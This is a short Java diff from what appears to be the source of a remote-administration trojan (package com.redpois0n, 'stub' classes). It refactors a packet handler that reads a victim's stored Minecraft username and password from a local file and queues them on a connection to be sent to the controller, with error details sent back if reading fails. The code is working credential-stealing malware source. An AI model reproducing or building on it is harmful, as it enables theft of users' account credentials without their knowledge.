@@ -13,7 +13,7 @@ import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.PBEParameterSpec;
 
 import com.redpois0n.Connection;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Packet36MinecraftPassword;
 
 
 public class PacketMC extends AbstractIncomingPacket {
@@ -53,10 +53,11 @@ public class PacketMC extends AbstractIncomingPacket {
 				dis = new DataInputStream(new FileInputStream(passFile));
 			}
 			
-			Connection.addToSendQueue(new PacketBuilder(Header.PASSWORD_MINECRAFT, new String[] { dis.readUTF(), dis.readUTF() }));
+			Connection.addToSendQueue(new Packet36MinecraftPassword(dis.readUTF(), dis.readUTF()));
 			dis.close();
 		} catch (Exception ex) {
-			Connection.addToSendQueue(new PacketBuilder(Header.PASSWORD_MINECRAFT, new String[] { "ERR", ex.getClass().getSimpleName() + ": " + ex.getMessage() }));
+			ex.printStackTrace();
+			Connection.addToSendQueue(new Packet36MinecraftPassword("ERR", ex.getClass().getSimpleName() + ": " + ex.getMessage() ));
 		}
 	}
 
